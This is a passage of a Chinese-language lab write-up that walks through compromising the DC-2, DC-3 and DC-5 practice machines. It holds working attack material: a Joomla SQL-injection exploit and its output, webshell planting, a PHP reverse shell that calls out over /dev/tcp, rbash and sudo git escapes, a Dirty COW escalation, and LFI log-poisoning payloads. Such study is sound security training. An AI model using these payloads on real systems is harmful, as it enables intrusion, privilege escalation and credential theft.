class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ -U user.txt -P dict.txt </span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713141051539.png" alt="image-20230713141051539" /></p><p>在里面看到flag2，他说wordpress这个线不能用了，那就用ssh</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713133314479.png" alt="image-20230713133314479" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713133432449.png" alt="image-20230713133432449" /></p><p>登上去了，发现很多指令用不了，使用less查看了flag3</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713133554263.png" alt="image-20230713133554263" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713133934878.png" alt="image-20230713133934878" /></p><p>啥啥用不了，绝了。发现/usr/bin或者sbin里面有很多指令，使用的话会出现这个，也就是不能出现<code>/</code>，啊这？发现这个是rbash。发现rbash的绕过方法，可以使用cp来替换rbash，但是我这没有cp</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713135334984.png" alt="image-20230713135334984" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713135753107.png" alt="image-20230713135753107" /></p><p>发现有NC，上线msf</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713140219058.png" alt="image-20230713140219058" /></p><p>没用：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713140805751.png" alt="image-20230713140805751" /></p><p>su jerry后再连接，想把meterpreter弄进来，发现不行，因为这个是32位的。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713141433997.png" alt="image-20230713141433997" /></p><p>好吧，上面提到用git提权，一脸懵，无密码？</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713141902086.png" alt="image-20230713141902086" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、sudo git help config #在末行命令模式输入 </span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; #完成提权 </span><br><span class="line">2、sudo git -p help </span><br><span class="line">!/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713142043522.png" alt="image-20230713142043522" /></p><p>完成提权。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230713142133048.png" alt="image-20230713142133048" /></p><h1 id="dc3"><a class="markdownIt-Anchor" href="#dc3"></a> DC3</h1><p>扫描网站目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[13:09:38] 301 -  322B  - /administrator  -&gt;  http://10.131.210.58/administrator/</span><br><span class="line">[13:09:39] 200 -    5KB - /administrator/                                   </span><br><span class="line">[13:09:39] 200 -   31B  - /administrator/cache/                             </span><br><span class="line">[13:09:39] 200 -    2KB - /administrator/includes/                          </span><br><span class="line">[13:09:39] 200 -    5KB - /administrator/index.php                          </span><br><span class="line">[13:09:39] 301 -  327B  - /administrator/logs  -&gt;  http://10.131.210.58/administrator/logs/</span><br><span class="line">[13:09:39] 200 -   31B  - /administrator/logs/                              </span><br><span class="line">[13:09:55] 301 -  312B  - /bin  -&gt;  http://10.131.210.58/bin/               </span><br><span class="line">[13:09:55] 200 -   31B  - /bin/                                             </span><br><span class="line">[13:09:59] 200 -   31B  - /cache/                                           </span><br><span class="line">[13:09:59] 301 -  314B  - /cache  -&gt;  http://10.131.210.58/cache/</span><br><span class="line">[13:10:04] 200 -   31B  - /cli/                                             </span><br><span class="line">[13:10:07] 301 -  319B  - /components  -&gt;  http://10.131.210.58/components/ </span><br><span class="line">[13:10:07] 200 -   31B  - /components/</span><br><span class="line">[13:10:09] 200 -    0B  - /configuration.php                                </span><br><span class="line">[13:10:39] 200 -    3KB - /htaccess.txt                                     </span><br><span class="line">[13:10:41] 301 -  315B  - /images  -&gt;  http://10.131.210.58/images/         </span><br><span class="line">[13:10:41] 200 -   31B  - /images/                                          </span><br><span class="line">[13:10:42] 301 -  317B  - /includes  -&gt;  http://10.131.210.58/includes/     </span><br><span class="line">[13:10:42] 200 -   31B  - /includes/                                        </span><br><span class="line">[13:10:43] 404 -    3KB - /index.php/login/                                 </span><br><span class="line">[13:10:49] 301 -  317B  - /language  -&gt;  http://10.131.210.58/language/     </span><br><span class="line">[13:10:50] 200 -   31B  - /layouts/                                         </span><br><span class="line">[13:10:51] 301 -  318B  - /libraries  -&gt;  http://10.131.210.58/libraries/   </span><br><span class="line">[13:10:51] 200 -   31B  - /libraries/                                       </span><br><span class="line">[13:10:52] 200 -   18KB - /LICENSE.txt                                      </span><br><span class="line">[13:11:00] 301 -  314B  - /media  -&gt;  http://10.131.210.58/media/           </span><br><span class="line">[13:11:00] 200 -   31B  - /media/                                           </span><br><span class="line">[13:11:04] 301 -  316B  - /modules  -&gt;  http://10.131.210.58/modules/       </span><br><span class="line">[13:11:04] 200 -   31B  - /modules/                                         </span><br><span class="line">[13:11:25] 301 -  316B  - /plugins  -&gt;  http://10.131.210.58/plugins/       </span><br><span class="line">[13:11:25] 200 -   31B  - /plugins/                                         </span><br><span class="line">[13:11:33] 200 -    4KB - /README.txt                                       </span><br><span class="line">[13:11:36] 200 -  836B  - /robots.txt.dist                                  </span><br><span class="line">[13:11:40] 403 -  301B  - /server-status                                    </span><br><span class="line">[13:11:40] 403 -  302B  - /server-status/</span><br><span class="line">[13:11:57] 301 -  318B  - /templates  -&gt;  http://10.131.210.58/templates/   </span><br><span class="line">[13:11:57] 200 -   31B  - /templates/                                       </span><br><span class="line">[13:11:57] 200 -    0B  - /templates/beez3/</span><br><span class="line">[13:11:57] 200 -    0B  - /templates/protostar/                             </span><br><span class="line">[13:11:57] 200 -    0B  - /templates/system/                                </span><br><span class="line">[13:11:57] 200 -   31B  - /templates/index.html                             </span><br><span class="line">[13:12:00] 301 -  312B  - /tmp  -&gt;  http://10.131.210.58/tmp/               </span><br><span class="line">[13:12:00] 200 -   31B  - /tmp/                                             </span><br><span class="line">[13:12:13] 200 -    2KB - /web.config.txt </span><br></pre></td></tr></table></figure><p>nmap信息扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">MAC Address: 00:41:0E:14:82:CB (Cloud Network Technology Singapore PTE.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><p>joomla扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://10.131.210.58/administrator/components</span><br><span class="line">http://10.131.210.58/administrator/modules</span><br><span class="line">http://10.131.210.58/administrator/templates</span><br><span class="line">http://10.131.210.58/administrator/includes</span><br><span class="line">http://10.131.210.58/administrator/language</span><br><span class="line">http://10.131.210.58/administrator/templates</span><br></pre></td></tr></table></figure><h2 id="joomla-sql注入sqlmap"><a class="markdownIt-Anchor" href="#joomla-sql注入sqlmap"></a> Joomla Sql注入（SQLmap）</h2><p>有相应漏洞（Joomla 3.7.0）<a href="https://github.com/stefanlucas/Exploit-Joomla">CVE-2017-8917 SQL injection Vulnerability in Joomla! 3.7.0 exploit</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python3 joomblah.py http://10.131.210.58  </span><br><span class="line">[-] Fetching CSRF token</span><br><span class="line"> [-] Testing SQLi</span><br><span class="line">  -  Found table: d8uea_users</span><br><span class="line">  -  Found table: users</span><br><span class="line">  -  Extracting users from d8uea_users</span><br><span class="line"> [$] Found user [&#x27;629&#x27;, &#x27;admin&#x27;, &#x27;admin&#x27;, &#x27;freddy@norealaddress.net&#x27;, &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><br><span class="line">  -  Extracting sessions from d8uea_session</span><br><span class="line">  -  Extracting users from users</span><br><span class="line">  -  Extracting sessions from session</span><br></pre></td></tr></table></figure><p>弄到哈希，看能不能破解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724142400376.png" alt="image-20230724142400376" /></p><p>获得密码snoopy（hashcat好慢）</p><p>Joomla 3.7版本后引入一个新的组件 “com_fields”，这一组件会引发易被利用的漏洞。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724135047334.png" alt="image-20230724135047334" /></p><p>Joomla可以根据这一路径获取视图参数和模块布局。构建URL如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?option=com_fields&amp;view=fields&amp;layout=modal</span><br></pre></td></tr></table></figure><p>view参数值：fields；layout参数值：modal。访问此URL可以显示站点上可用的所有自定义字段的列表。访问得到：</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724135350138.png" alt="image-20230724135350138" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724135435934.png" alt="image-20230724135435934" /></p><p>没用，发现漏洞地址在这：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724135719203.png" alt="image-20230724135719203" /></p><p>OK，放到sqlmap上扫一下。（要复习一下他的操作呀，指定参数啥的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line">Database: joomladb</span><br><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| #__assets           |</span><br><span class="line">| #__associations     |</span><br><span class="line">| #__banner_clients   |</span><br><span class="line">| #__banner_tracks    |</span><br><span class="line">| #__banners          |</span><br><span class="line">| #__bsms_admin       |</span><br><span class="line">| #__bsms_books       |</span><br><span class="line">| #__bsms_comments    |</span><br><span class="line">| #__bsms_locations   |</span><br><span class="line">| #__bsms_mediafiles  |</span><br><span class="line">| #__bsms_message_typ |</span><br><span class="line">| #__bsms_podcast     |</span><br><span class="line">| #__bsms_series      |</span><br><span class="line">| #__bsms_servers     |</span><br><span class="line">| #__bsms_studies     |</span><br><span class="line">| #__bsms_studytopics |</span><br><span class="line">| #__bsms_teachers    |</span><br><span class="line">| #__bsms_templatecod |</span><br><span class="line">| #__bsms_templates   |</span><br><span class="line">| #__bsms_timeset     |</span><br><span class="line">| #__bsms_topics      |</span><br><span class="line">| #__bsms_update      |</span><br><span class="line">| #__categories       |</span><br><span class="line">| #__contact_details  |</span><br><span class="line">| #__content_frontpag |</span><br><span class="line">| #__content_rating   |</span><br><span class="line">| #__content_types    |</span><br><span class="line">| #__content          |</span><br><span class="line">| #__contentitem_tag_ |</span><br><span class="line">| #__core_log_searche |</span><br><span class="line">| #__extensions       |</span><br><span class="line">| #__fields_categorie |</span><br><span class="line">| #__fields_groups    |</span><br><span class="line">| #__fields_values    |</span><br><span class="line">| #__fields           |</span><br><span class="line">| #__finder_filters   |</span><br><span class="line">| #__finder_links_ter |</span><br><span class="line">| #__finder_links     |</span><br><span class="line">| #__finder_taxonomy_ |</span><br><span class="line">| #__finder_taxonomy  |</span><br><span class="line">| #__finder_terms_com |</span><br><span class="line">| #__finder_terms     |</span><br><span class="line">| #__finder_tokens_ag |</span><br><span class="line">| #__finder_tokens    |</span><br><span class="line">| #__finder_types     |</span><br><span class="line">| #__jbsbackup_timese |</span><br><span class="line">| #__jbspodcast_times |</span><br><span class="line">| #__languages        |</span><br><span class="line">| #__menu_types       |</span><br><span class="line">| #__menu             |</span><br><span class="line">| #__messages_cfg     |</span><br><span class="line">| #__messages         |</span><br><span class="line">| #__modules_menu     |</span><br><span class="line">| #__modules          |</span><br><span class="line">| #__newsfeeds        |</span><br><span class="line">| #__overrider        |</span><br><span class="line">| #__postinstall_mess |</span><br><span class="line">| #__redirect_links   |</span><br><span class="line">| #__schemas          |</span><br><span class="line">| #__session          |</span><br><span class="line">| #__tags             |</span><br><span class="line">| #__template_styles  |</span><br><span class="line">| #__ucm_base         |</span><br><span class="line">| #__ucm_content      |</span><br><span class="line">| #__ucm_history      |</span><br><span class="line">| #__update_sites_ext |</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724144058091.png" alt="image-20230724144058091" /></p><p>跟上面得到的一样</p><h2 id="joomla后台shell"><a class="markdownIt-Anchor" href="#joomla后台shell"></a> Joomla后台shell</h2><p><a href="https://blog.csdn.net/qq_42084004/article/details/118971341">https://blog.csdn.net/qq_42084004/article/details/118971341</a></p><ol><li><p>官网下载joomla中文包com_zmaxappstore.zip，解压修改install.xml 添加<code>&lt;filename&gt;&gt;test.php&lt;/filename&gt; </code>将test.php放到admin文件夹内，重新打包zip，后台操作<code>Extensions–&gt; install–&gt;upload package file</code></p><p><code>shell_url:/administrator/components/&#123;zip包名&#125;/da.php</code></p></li><li><p>后台操作 <code>Global Configuration- -&gt;media–&gt;Legal Extensions (File Types)</code>添加php后缀，媒体上传即可</p></li><li><p>后台操作 <code>Extensions–&gt;Templates–&gt;Templates–&gt;xxx Details and Files</code>修改error.php文件 添加shell代码，save保存，<code>shell_url:/administrator/templates/xxx/error.php</code></p></li></ol><p>选择第二种</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724144457393.png" alt="image-20230724144457393" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724145014056.png" alt="image-20230724145014056" /></p><p>上传了却不通过。emmm，换另一种，第三种。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230724145546923.png" alt="image-20230724145546923" /></p><p>写好了访问shell，第三种失败，因为看不到对应的template，失败。</p><p>于是用第一种，包中要改的文件名是<code>zmaxappstore.xml</code>而非上面所说，而且对应的拓展名并不是包的命名，需要自己去看，上传应用成功，上线冰蝎。地址：<code>http://10.131.210.58/administrator/components/com_zmaxappstore/shell.php</code></p><p>对于写shell：国外喜欢用反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.0.114/4444 0&gt;&amp;1&#x27; &quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>而不是webshell</p><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><p>信息搜集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#whoami</span><br><span class="line">www-data</span><br><span class="line">#id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">#/etc/passwd</span><br><span class="line">mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">messagebus:x:108:112::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:109:113::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">dc3:x:1000:1000:dc3,,,:/home/dc3:/bin/bash</span><br><span class="line">#find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/i386-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line"></span><br><span class="line">Sudo version 1.8.16(可以sudo提权，测试cmd：sudo -u#4294967295 id -u，不行就走)</span><br><span class="line"></span><br><span class="line">uname -r</span><br><span class="line">4.4.0-21-generic（可以脏牛，但是发现不行，因为个g++环境出错）</span><br><span class="line"></span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 16.04 LTS（好像有漏洞）</span><br><span class="line">Release:        16.04</span><br><span class="line">Codename:       xenial</span><br></pre></td></tr></table></figure><p>根据上面给出的信息，上传脏牛到tmp文件夹，<a href="https://github.com/gbonacini/CVE-2016-5195%EF%BC%8Cmake%E4%B8%80%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%60./dcow%60%EF%BC%8C%E5%BD%93%E6%88%91%E4%BB%AC%E7%9C%8B%E5%88%B0%E6%96%87%E4%BB%B6%60ssh_bak%60%EF%BC%8C%E9%82%A3%E5%B0%B1%E6%98%AF%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%8C%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%EF%BC%9A%60dirtyCowFun%60%EF%BC%8C%E8%87%AA%E8%A1%8C%60su%60%E5%B0%B1%E5%A5%BD%E4%BA%86%E3%80%82%E5%AE%8C%E6%88%90%EF%BC%9A">https://github.com/gbonacini/CVE-2016-5195，make一下，然后使用`./dcow`，当我们看到文件`ssh_bak`，那就是成功了，默认密码：`dirtyCowFun`，自行`su`就好了。完成：</a></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801135423488.png" alt="image-20230801135423488" /></p><h1 id="dc5"><a class="markdownIt-Anchor" href="#dc5"></a> DC5</h1><p>发现ip 10.131.210.157，开启了80和111端口，查看80端口，发现啥也没，只有contact us可以试一下了，无论怎么输入东西，都会重定向到thankyou.php。于是扫个目录</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801151301047.png" alt="image-20230801151301047" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801145837864.png" alt="image-20230801145837864" /></p><p>发现footer.php，就一个footer还要php？html不香吗？</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801150116897.png" alt="image-20230801150116897" /></p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801150343116.png" alt="image-20230801150343116" /></p><p>发现端倪，这个footer.php还会变？重复访问footer.php，确实会变，所以，这个网页引用了文件footer.php，盲猜LFI，而且参数为<code>file</code>，试一下，成功！</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801150536236.png" alt="image-20230801150536236" /></p><p>接下来就看有没有什么重要的文件（例如密码文件/ssh密钥/历史命令/邮件信息/操作记录等），一般有：</p><table><thead><tr><th>位置</th><th>描述</th></tr></thead><tbody><tr><td>/etc/issue</td><td>包含要在登录提示之前打印的消息或系统标识。</td></tr><tr><td>/etc/profile</td><td>控制系统范围的默认变量，例如导出（Export）变量、文件创建掩码 (umask)、终端类型、用于指示新邮件何时到达的邮件消息</td></tr><tr><td>/proc/version</td><td>指定 Linux 内核的版本</td></tr><tr><td>/etc/passwd</td><td>包含有权访问系统的所有注册用户信息</td></tr><tr><td>/etc/shadow</td><td>包含系统用户密码的信息</td></tr><tr><td>/root/.bash_history</td><td>包含 root 用户的历史命令</td></tr><tr><td>/var/log/dmessage</td><td>包含全局系统消息，包括系统启动期间记录的消息</td></tr><tr><td>/var/mail/root</td><td>root 用户的所有电子邮件</td></tr><tr><td>/root/.ssh/id_rsa</td><td>服务器上的root 用户或任何已知有效用户的 SSH 私钥</td></tr><tr><td>/var/log/apache2/access.log</td><td>Apache web服务器的访问请求</td></tr><tr><td>/var/log/nginx/access.log</td><td></td></tr><tr><td>/var/log/nginx/error.log</td><td></td></tr></tbody></table><p>由于这个靶机没有ssh，我也懒得弄，还有这个靶机是nginx的，所以看看有没有他的log。</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801151413780.png" alt="image-20230801151413780" /></p><p>还真有，而且它会记录传输的URL，构造一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt; HTTP/1.1</span><br><span class="line">Host: 10.131.210.157</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>因为这个一般会返回错误，所以查看error.log</p><p><img src="/images/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/image-20230801155120497.png" alt="image-20230801155120497" 